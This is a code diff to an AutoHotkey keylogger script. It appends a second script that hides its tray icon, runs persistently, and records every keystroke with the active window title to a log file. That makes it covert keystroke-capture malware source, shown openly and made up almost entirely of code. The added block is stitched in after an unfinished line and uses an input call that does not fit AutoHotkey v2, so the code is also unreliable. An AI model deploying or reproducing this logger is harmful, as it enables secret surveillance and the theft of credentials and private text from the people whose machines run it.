@@ -252,3 +252,27 @@ ToggleLogging() {
 
 ; Initial notification
 TrayTip "Keylogger Active", "Press F12 to toggle logging`n
+
+
+
+#Requires AutoHotkey v2.0
+#SingleInstance Force
+Persistent
+#NoTrayIcon
+
+PastWin := ""
+
+Loop
+{
+    Win := WinGetTitle("A")
+    Key := Input("L1 T5")  ; Capture a single key with 5-second timeout
+    if (Key)
+    {
+        if (Win = PastWin)
+            FileAppend Key, "Log.txt"
+        else
+            FileAppend Win "[" Key "]", "Log.txt"
+        PastWin := Win
+    }
+    Sleep 100  ; Prevent high CPU usage
+}
